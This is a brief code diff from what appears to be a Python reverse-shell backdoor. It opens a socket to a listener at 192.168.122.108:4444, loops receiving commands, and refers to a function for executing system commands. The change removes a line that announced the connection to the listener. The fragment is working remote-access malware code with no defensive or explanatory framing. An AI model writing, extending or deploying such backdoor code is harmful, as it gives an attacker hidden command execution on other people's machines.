@@ -10,7 +10,6 @@ def execute_system_commmand(command):
 
 connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection.connect(("192.168.122.108", 4444))
-connection.send(b"\n[+] Connection established\n")
 
 while True:
     command = connection.recv(4096)
